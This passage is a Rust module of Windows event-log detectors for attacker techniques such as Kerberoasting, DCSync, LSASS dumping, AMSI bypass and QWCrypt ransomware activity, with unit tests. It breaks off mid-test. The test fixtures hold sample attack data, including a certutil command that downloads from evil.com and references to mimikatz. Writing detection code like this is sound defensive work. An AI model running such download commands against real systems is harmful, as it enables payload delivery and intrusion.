//! Detection use cases: 23 TTP detectors operating on parsed EvtxEvent slices.

use forensicnomicon::heuristics::evtx::{
    AMSI_BYPASS_PATTERNS, ARCHIVER_PROCESS_NAMES, BITS_CLIENT_CHANNEL, BYOVD_DRIVER_NAMES,
    DEFENDER_CHANNEL, DEFENDER_TAMPER_PATTERNS, EID_BITS_TRANSFER_START,
    EID_DIRECTORY_SERVICE_ACCESS, EID_HYPERV_VM_STATE_CHANGE, EID_HYPERV_VM_STOPPED,
    EID_KERBEROS_TGS_REQUEST, EID_KERBEROS_TGT_REQUEST, EID_LOG_CLEARED,
    EID_PROCESS_CREATE, EID_PS_SCRIPT_BLOCK, EID_SECURITY_TASK_CREATED,
    EID_SERVICE_INSTALLED, EID_SERVICE_INSTALLED_SECURITY, EID_SMB_SHARE_ACCESS,
    EID_SYSMON_DNS_QUERY, EID_SYSMON_FILE_CREATE, EID_SYSMON_PROCESS_ACCESS,
    EID_SYSMON_PROCESS_CREATE, EID_TASK_COMPLETED, EID_TASK_DELETED, EID_TASK_LAUNCHED,
    EID_TASK_REGISTERED, EID_TASK_UPDATED, EID_VSS_ERROR, EID_VSS_SNAPSHOT_DELETED,
    EID_WMI_FILTER_TRIGGERED, EID_WMI_OPERATION_FAILURE, EID_WMI_QUERY,
    EID_DEFENDER_REALTIME_DISABLED, EID_DEFENDER_CONFIG_CHANGED, EID_LOGON,
    GUID_DS_REPLICATION_GET_CHANGES, GUID_DS_REPLICATION_GET_CHANGES_ALL,
    GUID_DS_REPLICATION_FILTERED, HYPERV_VMMS_CHANNEL, LSASS_DUMP_ACCESS_MASKS,
    LSASS_IMAGE_NAME, PSEXEC_SERVICE_PATTERNS, QWCRYPT_PS_PATTERNS, SYSMON_CHANNEL,
    SYSMON_FIELD_GRANTED_ACCESS, SYSMON_FIELD_IMAGE, SYSMON_FIELD_TARGET_IMAGE,
    TASKSCHEDULER_CHANNEL, WMI_ACTIVITY_CHANNEL,
};
use forensicnomicon::lolbins::is_lolbas_windows;
use winevt_core::EvtxEvent;

use crate::net_correlation::shannon_entropy;

/// Confidence level of a detection.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Confidence {
    Low,
    Medium,
    High,
}

/// A single detection hit from a TTP detector.
#[derive(Debug, Clone)]
pub struct Detection {
    pub technique: &'static str,
    pub mitre_technique_id: &'static str,
    pub tactic: &'static str,
    pub confidence: Confidence,
    pub evidence: Vec<EvtxEvent>,
    pub description: String,
}

/// Detect Kerberoasting: EID 4769 with RC4 encryption type (0x17).
pub fn detect_kerberoasting(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_KERBEROS_TGS_REQUEST)
        .filter(|e| {
            e.data.get("TicketEncryptionType")
                .map(|t| t.trim().to_lowercase() == "0x17")
                .unwrap_or(false)
        })
        .filter(|e| {
            // Skip machine accounts (end with $)
            !e.data.get("TargetUserName")
                .map(|u| u.ends_with('$'))
                .unwrap_or(false)
        })
        .map(|e| Detection {
            technique: "Kerberoasting",
            mitre_technique_id: "T1558.003",
            tactic: "credential-access",
            confidence: Confidence::High,
            evidence: vec![e.clone()],
            description: format!(
                "RC4 (0x17) TGS request for service '{}'",
                e.data.get("ServiceName").map(String::as_str).unwrap_or("?")
            ),
        })
        .collect()
}

/// Detect AS-REP Roasting: EID 4768 with PreAuthType = 0.
pub fn detect_asrep_roasting(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_KERBEROS_TGT_REQUEST)
        .filter(|e| {
            e.data.get("PreAuthType")
                .map(|t| t.trim() == "0")
                .unwrap_or(false)
        })
        .map(|e| Detection {
            technique: "AS-REP Roasting",
            mitre_technique_id: "T1558.004",
            tactic: "credential-access",
            confidence: Confidence::High,
            evidence: vec![e.clone()],
            description: format!(
                "Pre-authentication disabled for '{}'",
                e.data.get("TargetUserName").map(String::as_str).unwrap_or("?")
            ),
        })
        .collect()
}

const DCSYNC_GUIDS: &[&str] = &[
    GUID_DS_REPLICATION_GET_CHANGES,
    GUID_DS_REPLICATION_GET_CHANGES_ALL,
    GUID_DS_REPLICATION_FILTERED,
];

/// Detect DCSync: EID 4662 with DS-Replication GUIDs.
pub fn detect_dcsync(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_DIRECTORY_SERVICE_ACCESS)
        .filter(|e| {
            if let Some(props) = e.data.get("Properties") {
                let props_lc = props.to_lowercase();
                DCSYNC_GUIDS.iter().any(|g| props_lc.contains(&g.to_lowercase()))
            } else {
                false
            }
        })
        .map(|e| Detection {
            technique: "DCSync",
            mitre_technique_id: "T1003.006",
            tactic: "credential-access",
            confidence: Confidence::High,
            evidence: vec![e.clone()],
            description: format!(
                "DS-Replication GUID seen for account '{}'",
                e.data.get("SubjectUserName").map(String::as_str).unwrap_or("?")
            ),
        })
        .collect()
}

fn parse_access_mask(s: &str) -> Option<u32> {
    let s = s.trim();
    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        u32::from_str_radix(hex, 16).ok()
    } else {
        s.parse().ok()
    }
}

/// Detect LSASS credential access: Sysmon EID 10 with suspicious GrantedAccess masks.
pub fn detect_lsass_access(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_SYSMON_PROCESS_ACCESS && e.channel == SYSMON_CHANNEL)
        .filter(|e| {
            e.data.get(SYSMON_FIELD_TARGET_IMAGE)
                .map(|img| img.to_lowercase().ends_with(LSASS_IMAGE_NAME))
                .unwrap_or(false)
        })
        .filter(|e| {
            e.data.get(SYSMON_FIELD_GRANTED_ACCESS)
                .and_then(|m| parse_access_mask(m))
                .map(|mask| LSASS_DUMP_ACCESS_MASKS.contains(&mask))
                .unwrap_or(false)
        })
        .map(|e| Detection {
            technique: "LSASS Memory Dump",
            mitre_technique_id: "T1003.001",
            tactic: "credential-access",
            confidence: Confidence::High,
            evidence: vec![e.clone()],
            description: format!(
                "LSASS accessed with mask {} from '{}'",
                e.data.get(SYSMON_FIELD_GRANTED_ACCESS).map(String::as_str).unwrap_or("?"),
                e.data.get("SourceImage").map(String::as_str).unwrap_or("?")
            ),
        })
        .collect()
}

/// Detect PsExec: EID 7045 with PSEXESVC/PAExec service name patterns.
pub fn detect_psexec(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_SERVICE_INSTALLED)
        .filter(|e| {
            e.data.get("ServiceName")
                .map(|n| PSEXEC_SERVICE_PATTERNS.iter().any(|p| n.contains(p)))
                .unwrap_or(false)
        })
        .map(|e| Detection {
            technique: "PsExec / Remote Execution Service",
            mitre_technique_id: "T1569.002",
            tactic: "execution",
            confidence: Confidence::High,
            evidence: vec![e.clone()],
            description: format!(
                "PsExec-pattern service '{}' installed",
                e.data.get("ServiceName").map(String::as_str).unwrap_or("?")
            ),
        })
        .collect()
}

const TASK_EIDS: &[u32] = &[
    EID_TASK_REGISTERED, EID_TASK_UPDATED, EID_TASK_DELETED,
    EID_TASK_LAUNCHED, EID_TASK_COMPLETED,
];

/// Detect scheduled task abuse: TaskScheduler EID 106/140/141/200/201.
pub fn detect_scheduled_task_abuse(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.channel == TASKSCHEDULER_CHANNEL && TASK_EIDS.contains(&e.event_id))
        .map(|e| Detection {
            technique: "Scheduled Task",
            mitre_technique_id: "T1053.005",
            tactic: "persistence",
            confidence: Confidence::Medium,
            evidence: vec![e.clone()],
            description: format!(
                "Scheduled task activity (EID {}) for '{}'",
                e.event_id,
                e.data.get("TaskName").map(String::as_str).unwrap_or("?")
            ),
        })
        .collect()
}

/// Detect service-based persistence: EID 7045 (System) or EID 4697 (Security).
pub fn detect_service_persistence(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_SERVICE_INSTALLED || e.event_id == EID_SERVICE_INSTALLED_SECURITY)
        .filter(|e| {
            // Skip PsExec patterns — handled by detect_psexec
            !e.data.get("ServiceName")
                .map(|n| PSEXEC_SERVICE_PATTERNS.iter().any(|p| n.contains(p)))
                .unwrap_or(false)
        })
        .map(|e| Detection {
            technique: "Service Persistence",
            mitre_technique_id: "T1543.003",
            tactic: "persistence",
            confidence: Confidence::Medium,
            evidence: vec![e.clone()],
            description: format!(
                "Service '{}' installed (EID {})",
                e.data.get("ServiceName").map(String::as_str).unwrap_or("?"),
                e.event_id
            ),
        })
        .collect()
}

/// Detect WMI subscription persistence: WMI-Activity EID 5860/5861.
pub fn detect_wmi_subscription(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.channel == WMI_ACTIVITY_CHANNEL)
        .filter(|e| e.event_id == EID_WMI_FILTER_TRIGGERED || e.event_id == 5860)
        .map(|e| Detection {
            technique: "WMI Event Subscription",
            mitre_technique_id: "T1546.003",
            tactic: "persistence",
            confidence: Confidence::High,
            evidence: vec![e.clone()],
            description: format!(
                "WMI subscription event (EID {}) — consumer: {}",
                e.event_id,
                e.data.get("Consumer").map(String::as_str).unwrap_or("?")
            ),
        })
        .collect()
}

fn extract_image_basename(ev: &EvtxEvent) -> Option<String> {
    let path = if ev.event_id == EID_SYSMON_PROCESS_CREATE && ev.channel == SYSMON_CHANNEL {
        ev.data.get(SYSMON_FIELD_IMAGE)?.as_str()
    } else if ev.event_id == EID_PROCESS_CREATE {
        ev.data.get("NewProcessName")?.as_str()
    } else {
        return None;
    };
    Some(
        path.rsplit(|c| c == '\\' || c == '/')
            .next()
            .unwrap_or(path)
            .to_lowercase(),
    )
}

/// Detect LOLBAS execution: EID 4688 / Sysmon EID 1 with process in LOLBAS list.
pub fn detect_lolbas(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter_map(|e| {
            let basename = extract_image_basename(e)?;
            if is_lolbas_windows(&basename) {
                Some(Detection {
                    technique: "LOLBAS Execution",
                    mitre_technique_id: "T1218",
                    tactic: "defense-evasion",
                    confidence: Confidence::Medium,
                    evidence: vec![e.clone()],
                    description: format!("LOLBAS binary '{}' executed", basename),
                })
            } else {
                None
            }
        })
        .collect()
}

/// Detect AMSI bypass: PS EID 4104 script blocks containing bypass patterns.
pub fn detect_amsi_bypass(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_PS_SCRIPT_BLOCK)
        .filter_map(|e| {
            let script = e.data.get("ScriptBlockText")?;
            let pattern = AMSI_BYPASS_PATTERNS.iter()
                .find(|&&p| script.to_lowercase().contains(&p.to_lowercase()))?;
            Some(Detection {
                technique: "AMSI Bypass",
                mitre_technique_id: "T1562.001",
                tactic: "defense-evasion",
                confidence: Confidence::High,
                evidence: vec![e.clone()],
                description: format!("AMSI bypass pattern '{}' in script block", pattern),
            })
        })
        .collect()
}

/// Detect Defender tampering: EID 5001/5007 or PS 4104 with Defender tamper patterns.
pub fn detect_defender_tampering(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| {
            let is_defender_event = e.channel == DEFENDER_CHANNEL
                && (e.event_id == EID_DEFENDER_REALTIME_DISABLED || e.event_id == EID_DEFENDER_CONFIG_CHANGED);
            let is_ps_tamper = e.event_id == EID_PS_SCRIPT_BLOCK
                && e.data.get("ScriptBlockText")
                    .map(|s| DEFENDER_TAMPER_PATTERNS.iter().any(|p| s.contains(p)))
                    .unwrap_or(false);
            is_defender_event || is_ps_tamper
        })
        .map(|e| Detection {
            technique: "Defender Tampering",
            mitre_technique_id: "T1562.001",
            tactic: "defense-evasion",
            confidence: Confidence::High,
            evidence: vec![e.clone()],
            description: format!("Defender tampered via EID {}", e.event_id),
        })
        .collect()
}

/// Detect SMB lateral movement: EID 4624 LogonType=3 paired with EID 5140/5145 (same LogonId window).
pub fn detect_smb_lateral_movement(events: &[EvtxEvent]) -> Vec<Detection> {
    use std::collections::HashSet;

    // Collect LogonIds from Type-3 logons with a source IP
    let type3_ids: HashSet<u64> = events.iter()
        .filter(|e| {
            e.event_id == EID_LOGON
                && e.data.get("LogonType").map(|t| t == "3").unwrap_or(false)
                && e.data.get("IpAddress").map(|ip| !ip.is_empty() && ip != "-").unwrap_or(false)
        })
        .filter_map(|e| {
            e.logon_id.or_else(|| {
                e.data.get("TargetLogonId")
                    .and_then(|s| parse_logon_id(s))
            })
        })
        .collect();

    // Find SMB share access events whose LogonId matches a Type-3 logon
    events.iter()
        .filter(|e| e.event_id == EID_SMB_SHARE_ACCESS || e.event_id == 5145)
        .filter_map(|e| {
            let lid = e.logon_id.or_else(|| {
                e.data.get("SubjectLogonId").and_then(|s| parse_logon_id(s))
            })?;
            if type3_ids.contains(&lid) {
                Some(Detection {
                    technique: "SMB Lateral Movement",
                    mitre_technique_id: "T1021.002",
                    tactic: "lateral-movement",
                    confidence: Confidence::High,
                    evidence: vec![e.clone()],
                    description: format!(
                        "SMB share '{}' accessed via Type-3 logon (LogonId 0x{lid:x})",
                        e.data.get("ShareName").map(String::as_str).unwrap_or("?")
                    ),
                })
            } else {
                None
            }
        })
        .collect()
}

fn parse_logon_id(s: &str) -> Option<u64> {
    let s = s.trim();
    if s.is_empty() || s == "-" { return None; }
    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        u64::from_str_radix(hex, 16).ok()
    } else {
        s.parse().ok()
    }
}

/// Detect Pass-the-Hash: EID 4624 with LogonType=9 and NTLM authentication.
pub fn detect_pass_the_hash(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| {
            e.event_id == EID_LOGON
                && e.data.get("LogonType").map(|t| t == "9").unwrap_or(false)
                && e.data.get("AuthenticationPackageName")
                    .map(|pkg| pkg.to_uppercase().contains("NTLM"))
                    .unwrap_or(false)
        })
        .map(|e| Detection {
            technique: "Pass-the-Hash",
            mitre_technique_id: "T1550.002",
            tactic: "lateral-movement",
            confidence: Confidence::High,
            evidence: vec![e.clone()],
            description: format!(
                "LogonType=9 NTLM logon for '{}'",
                e.data.get("TargetUserName").map(String::as_str).unwrap_or("?")
            ),
        })
        .collect()
}

/// Detect BITS persistence: BITS-Client EID 59/60 with HTTP/HTTPS URLs.
pub fn detect_bits_persistence(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.channel == BITS_CLIENT_CHANNEL)
        .filter(|e| e.event_id == EID_BITS_TRANSFER_START || e.event_id == 60)
        .filter(|e| {
            // Flag transfers with external (http/https) URLs
            e.data.values().any(|v| {
                let lc = v.to_lowercase();
                lc.starts_with("http://") || lc.starts_with("https://") || lc.starts_with("ftp://")
            })
        })
        .map(|e| Detection {
            technique: "BITS Persistence",
            mitre_technique_id: "T1197",
            tactic: "persistence",
            confidence: Confidence::Medium,
            evidence: vec![e.clone()],
            description: format!("BITS transfer (EID {}) to external URL", e.event_id),
        })
        .collect()
}

/// Detect compression/staging: Sysmon EID 1 with archiver process basenames.
pub fn detect_compression_staging(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_SYSMON_PROCESS_CREATE && e.channel == SYSMON_CHANNEL)
        .filter_map(|e| {
            let image = e.data.get(SYSMON_FIELD_IMAGE)?;
            let basename = image.rsplit(|c| c == '\\' || c == '/').next().unwrap_or(image.as_str()).to_lowercase();
            if ARCHIVER_PROCESS_NAMES.iter().any(|a| basename == *a) {
                Some(Detection {
                    technique: "Data Compression / Staging",
                    mitre_technique_id: "T1560.001",
                    tactic: "collection",
                    confidence: Confidence::Medium,
                    evidence: vec![e.clone()],
                    description: format!("Archiver '{}' executed", basename),
                })
            } else {
                None
            }
        })
        .collect()
}

const DNS_EXFIL_ENTROPY_THRESHOLD: f64 = 3.5;

/// Detect DNS/cloud exfiltration: Sysmon EID 22 with high-entropy subdomain.
pub fn detect_dns_cloud_exfil(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_SYSMON_DNS_QUERY && e.channel == SYSMON_CHANNEL)
        .filter_map(|e| {
            let qname = e.data.get("QueryName")?;
            // Score entropy on the leftmost (subdomain) label
            let subdomain = qname.split('.').next().unwrap_or(qname);
            let entropy = shannon_entropy(subdomain);
            if entropy >= DNS_EXFIL_ENTROPY_THRESHOLD {
                Some(Detection {
                    technique: "DNS Exfiltration",
                    mitre_technique_id: "T1048.003",
                    tactic: "exfiltration",
                    confidence: Confidence::Medium,
                    evidence: vec![e.clone()],
                    description: format!(
                        "High-entropy DNS query '{qname}' (entropy={entropy:.2})"
                    ),
                })
            } else {
                None
            }
        })
        .collect()
}

/// Detect BYOVD driver install: EID 7045 with a known-vulnerable driver service name.
///
/// QWCrypt/RedCurl install Zemana Anti-Malware (ZAM64.sys) as a service then use
/// its privileged kernel access to terminate EDR processes before deploying the
/// encryptor (MITRE T1068 — Exploitation for Privilege Escalation).
pub fn detect_byovd_driver_install(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_SERVICE_INSTALLED)
        .filter(|e| {
            e.data.get("ServiceName")
                .map(|n| BYOVD_DRIVER_NAMES.iter().any(|d| n.eq_ignore_ascii_case(d)))
                .unwrap_or(false)
        })
        .map(|e| Detection {
            technique: "BYOVD Driver Install",
            mitre_technique_id: "T1068",
            tactic: "privilege-escalation",
            confidence: Confidence::High,
            evidence: vec![e.clone()],
            description: format!(
                "Known-vulnerable driver '{}' installed as a service (BYOVD — T1068)",
                e.data.get("ServiceName").map(String::as_str).unwrap_or("?")
            ),
        })
        .collect()
}

/// Detect VSS shadow copy deletion: Application EID 8193 (VSS error) or EID 524
/// (snapshot deleted). QWCrypt destroys VSS snapshots to prevent recovery (T1490).
pub fn detect_vss_deletion(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_VSS_ERROR || e.event_id == EID_VSS_SNAPSHOT_DELETED)
        .map(|e| Detection {
            technique: "VSS Shadow Copy Deletion",
            mitre_technique_id: "T1490",
            tactic: "impact",
            confidence: Confidence::High,
            evidence: vec![e.clone()],
            description: format!(
                "VSS shadow copy deletion indicator (EID {})",
                e.event_id
            ),
        })
        .collect()
}

/// Detect Hyper-V mass VM state change: ≥3 unique VMs stopping within 60 minutes.
///
/// QWCrypt shuts down all Hyper-V virtual machines before encrypting the VHD/VHDX
/// files on disk — a mass shutdown of 3+ distinct VMs is a strong ransomware signal
/// (MITRE T1486 — Data Encrypted for Impact).
pub fn detect_hyperv_mass_state_change(events: &[EvtxEvent]) -> Vec<Detection> {
    use std::collections::HashSet;

    const WINDOW_NS: i64 = 60 * 60 * 1_000_000_000; // 60 minutes
    const VM_THRESHOLD: usize = 3;

    let stopping: Vec<&EvtxEvent> = events
        .iter()
        .filter(|e| {
            (e.event_id == EID_HYPERV_VM_STATE_CHANGE || e.event_id == EID_HYPERV_VM_STOPPED)
                && e.channel == HYPERV_VMMS_CHANNEL
        })
        .collect();

    if stopping.len() < VM_THRESHOLD {
        return vec![];
    }

    // Slide a 60-minute window; if ≥ VM_THRESHOLD unique VM names appear → alert.
    for (i, anchor) in stopping.iter().enumerate() {
        let window_end = anchor.timestamp_ns + WINDOW_NS;
        let mut vms: HashSet<&str> = HashSet::new();
        let mut window_events: Vec<EvtxEvent> = Vec::new();
        for ev in stopping.iter().skip(i) {
            if ev.timestamp_ns > window_end {
                break;
            }
            if let Some(name) = ev.data.get("VmName") {
                vms.insert(name.as_str());
                window_events.push((*ev).clone());
            }
        }
        if vms.len() >= VM_THRESHOLD {
            return vec![Detection {
                technique: "Hyper-V Mass VM Shutdown",
                mitre_technique_id: "T1486",
                tactic: "impact",
                confidence: Confidence::High,
                evidence: window_events,
                description: format!(
                    "{} Hyper-V VMs stopped within 60 min (QWCrypt pre-encryption shutdown)",
                    vms.len()
                ),
            }];
        }
    }

    vec![]
}

/// Detect WMI lateral movement: EID 5857/5858 in WMI-Activity where
/// `ClientMachine` contains a remote UNC hostname (`\\<host>`).
///
/// Local WMI queries are expected noise; a `ClientMachine` that begins with `\\`
/// indicates a remote WMI operation — a lateral-movement indicator (T1047).
pub fn detect_wmi_lateral_movement(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| {
            (e.event_id == EID_WMI_QUERY || e.event_id == EID_WMI_OPERATION_FAILURE)
                && e.channel == WMI_ACTIVITY_CHANNEL
        })
        .filter(|e| {
            e.data.get("ClientMachine")
                .map(|m| m.starts_with("\\\\"))
                .unwrap_or(false)
        })
        .map(|e| Detection {
            technique: "WMI Remote Lateral Movement",
            mitre_technique_id: "T1047",
            tactic: "lateral-movement",
            confidence: Confidence::Medium,
            evidence: vec![e.clone()],
            description: format!(
                "Remote WMI operation from '{}' by '{}'",
                e.data.get("ClientMachine").map(String::as_str).unwrap_or("?"),
                e.data.get("User").map(String::as_str).unwrap_or("?"),
            ),
        })
        .collect()
}

/// Detect QWCrypt-specific PowerShell patterns: EID 4104 script blocks containing
/// Hyper-V management or shadow-deletion commands observed in RedCurl intrusions.
pub fn detect_qwcrypt_ps_patterns(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_PS_SCRIPT_BLOCK)
        .filter_map(|e| {
            let script = e.data.get("ScriptBlockText")?;
            let pattern = QWCRYPT_PS_PATTERNS
                .iter()
                .find(|&&p| script.to_lowercase().contains(&p.to_lowercase()))?;
            Some(Detection {
                technique: "QWCrypt PowerShell",
                mitre_technique_id: "T1059.001",
                tactic: "execution",
                confidence: Confidence::High,
                evidence: vec![e.clone()],
                description: format!("QWCrypt pattern '{}' in PowerShell script block", pattern),
            })
        })
        .collect()
}

/// Detect scheduled task creation via Security audit: EID 4698 (Security channel).
///
/// Complements `detect_scheduled_task_abuse` (TaskScheduler/Operational EID 106);
/// the Security channel entry persists even when the TaskScheduler log is cleared.
pub fn detect_security_task_created(events: &[EvtxEvent]) -> Vec<Detection> {
    events
        .iter()
        .filter(|e| e.event_id == EID_SECURITY_TASK_CREATED)
        .map(|e| Detection {
            technique: "Scheduled Task (Security Audit)",
            mitre_technique_id: "T1053.005",
            tactic: "persistence",
            confidence: Confidence::Medium,
            evidence: vec![e.clone()],
            description: format!(
                "Scheduled task '{}' created (Security EID 4698, user '{}')",
                e.data.get("TaskName").map(String::as_str).unwrap_or("?"),
                e.data.get("SubjectUserName").map(String::as_str).unwrap_or("?"),
            ),
        })
        .collect()
}

/// Composite QWCrypt cluster: BYOVD install AND (VSS deletion OR Hyper-V mass
/// shutdown) within a 24-hour window → High-confidence QWCrypt attribution.
pub fn detect_qwcrypt_cluster(events: &[EvtxEvent]) -> Vec<Detection> {
    const WINDOW_NS: i64 = 86_400 * 1_000_000_000; // 24 hours

    let byovd = detect_byovd_driver_install(events);
    if byovd.is_empty() {
        return vec![];
    }
    let vss = detect_vss_deletion(events);
    let hyperv = detect_hyperv_mass_state_change(events);
    if vss.is_empty() && hyperv.is_empty() {
        return vec![];
    }

    // Ensure at least one corroborating signal falls within 24 h of the BYOVD event.
    let byovd_ts: Vec<i64> = byovd
        .iter()
        .flat_map(|d| d.evidence.iter().map(|e| e.timestamp_ns))
        .collect();

    let corroborating: Vec<&Detection> = vss.iter().chain(hyperv.iter()).collect();
    let corroborated = corroborating.iter().any(|d| {
        d.evidence.iter().any(|ce| {
            byovd_ts.iter().any(|&bt| (ce.timestamp_ns - bt).abs() < WINDOW_NS)
        })
    });

    if !corroborated {
        return vec![];
    }

    let mut evidence: Vec<EvtxEvent> = byovd.iter()
        .chain(vss.iter())
        .chain(hyperv.iter())
        .flat_map(|d| d.evidence.iter().cloned())
        .collect();
    evidence.sort_by_key(|e| e.timestamp_ns);

    vec![Detection {
        technique: "QWCrypt Ransomware Cluster",
        mitre_technique_id: "T1486",
        tactic: "impact",
        confidence: Confidence::High,
        evidence,
        description: "QWCrypt/RedCurl cluster: BYOVD driver install correlated with VSS \
            deletion or Hyper-V mass shutdown within 24 h".to_string(),
    }]
}

/// Run all 23 detectors and aggregate results.
pub fn run_all_detectors(events: &[EvtxEvent]) -> Vec<Detection> {
    let mut results = Vec::new();
    results.extend(detect_kerberoasting(events));
    results.extend(detect_asrep_roasting(events));
    results.extend(detect_dcsync(events));
    results.extend(detect_lsass_access(events));
    results.extend(detect_psexec(events));
    results.extend(detect_scheduled_task_abuse(events));
    results.extend(detect_service_persistence(events));
    results.extend(detect_wmi_subscription(events));
    results.extend(detect_lolbas(events));
    results.extend(detect_amsi_bypass(events));
    results.extend(detect_defender_tampering(events));
    results.extend(detect_smb_lateral_movement(events));
    results.extend(detect_pass_the_hash(events));
    results.extend(detect_bits_persistence(events));
    results.extend(detect_compression_staging(events));
    results.extend(detect_dns_cloud_exfil(events));
    results.extend(detect_byovd_driver_install(events));
    results.extend(detect_vss_deletion(events));
    results.extend(detect_hyperv_mass_state_change(events));
    results.extend(detect_wmi_lateral_movement(events));
    results.extend(detect_qwcrypt_ps_patterns(events));
    results.extend(detect_security_task_created(events));
    results.extend(detect_qwcrypt_cluster(events));
    results
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn make_event(event_id: u32, channel: &str, data: Vec<(&str, &str)>, ts: i64) -> EvtxEvent {
        EvtxEvent {
            event_id, channel: channel.into(), timestamp_ns: ts, computer: "DC01".into(),
            user_sid: None, logon_id: None, process_id: None, thread_id: None,
            data: data.into_iter().map(|(k, v)| (k.into(), v.into())).collect(),
        }
    }

    #[test]
    fn kerberoasting_detected_on_rc4_tgs() {
        let ev = vec![make_event(4769, "Security", vec![("TicketEncryptionType","0x17"),("ServiceName","MSSQLSvc/srv"),("TargetUserName","svc")], 1_000_000_000)];
        let hits = detect_kerberoasting(&ev);
        assert!(!hits.is_empty(), "RC4 TGS should be flagged");
        assert_eq!(hits[0].mitre_technique_id, "T1558.003");
    }
    #[test]
    fn kerberoasting_ignores_aes_tickets() {
        let ev = vec![make_event(4769, "Security", vec![("TicketEncryptionType","0x12"),("ServiceName","MSSQLSvc/srv"),("TargetUserName","svc")], 1_000)];
        assert!(detect_kerberoasting(&ev).is_empty());
    }
    #[test]
    fn kerberoasting_empty_events() { assert!(detect_kerberoasting(&[]).is_empty()); }

    #[test]
    fn asrep_detected_on_preauth_disabled() {
        let ev = vec![make_event(4768, "Security", vec![("PreAuthType","0"),("TargetUserName","nopa")], 1_000_000_000)];
        let hits = detect_asrep_roasting(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1558.004");
    }
    #[test]
    fn asrep_ignores_normal_tgt() {
        let ev = vec![make_event(4768, "Security", vec![("PreAuthType","2"),("TargetUserName","normaluser")], 1_000)];
        assert!(detect_asrep_roasting(&ev).is_empty());
    }

    #[test]
    fn dcsync_detected_on_replication_guid() {
        let ev = vec![make_event(4662, "Security", vec![("Properties","{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}"),("SubjectUserName","attacker"),("SubjectUserSid","S-1-5-21-999-1001")], 1_000_000_000)];
        let hits = detect_dcsync(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1003.006");
    }
    #[test]
    fn dcsync_empty_events() { assert!(detect_dcsync(&[]).is_empty()); }

    #[test]
    fn lsass_access_detected_on_dump_mask() {
        let ev = vec![make_event(10, "Microsoft-Windows-Sysmon/Operational", vec![("TargetImage","C:\\Windows\\System32\\lsass.exe"),("GrantedAccess","0x1010"),("SourceImage","C:\\Users\\attacker\\mimikatz.exe")], 1_000_000_000)];
        let hits = detect_lsass_access(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1003.001");
    }
    #[test]
    fn lsass_access_ignores_normal_mask() {
        let ev = vec![make_event(10, "Microsoft-Windows-Sysmon/Operational", vec![("TargetImage","C:\\Windows\\System32\\lsass.exe"),("GrantedAccess","0x0400"),("SourceImage","C:\\Windows\\System32\\svchost.exe")], 1_000)];
        assert!(detect_lsass_access(&ev).is_empty());
    }

    #[test]
    fn psexec_detected_on_psexesvc() {
        let ev = vec![make_event(7045, "System", vec![("ServiceName","PSEXESVC"),("ImagePath","C:\\Windows\\PSEXESVC.exe")], 1_000_000_000)];
        let hits = detect_psexec(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1569.002");
    }

    #[test]
    fn scheduled_task_registered_detected() {
        let ev = vec![make_event(106, "Microsoft-Windows-TaskScheduler/Operational", vec![("TaskName","\\malicious_task")], 1_000_000_000)];
        let hits = detect_scheduled_task_abuse(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1053.005");
    }
    #[test]
    fn scheduled_task_empty() { assert!(detect_scheduled_task_abuse(&[]).is_empty()); }

    #[test]
    fn service_persistence_detected_on_7045() {
        let ev = vec![make_event(7045, "System", vec![("ServiceName","evil_svc"),("ImagePath","C:\\Users\\attacker\\evil.exe")], 1_000_000_000)];
        let hits = detect_service_persistence(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1543.003");
    }

    #[test]
    fn wmi_subscription_detected_on_5861() {
        let ev = vec![make_event(5861, "Microsoft-Windows-WMI-Activity/Operational", vec![("Consumer","CommandLineEventConsumer")], 1_000_000_000)];
        let hits = detect_wmi_subscription(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1546.003");
    }

    #[test]
    fn lolbas_detected_on_certutil() {
        let ev = vec![make_event(4688, "Security", vec![("NewProcessName","C:\\Windows\\System32\\certutil.exe"),("CommandLine","certutil -urlcache http://evil.com/p")], 1_000_000_000)];
        let hits = detect_lolbas(&ev);
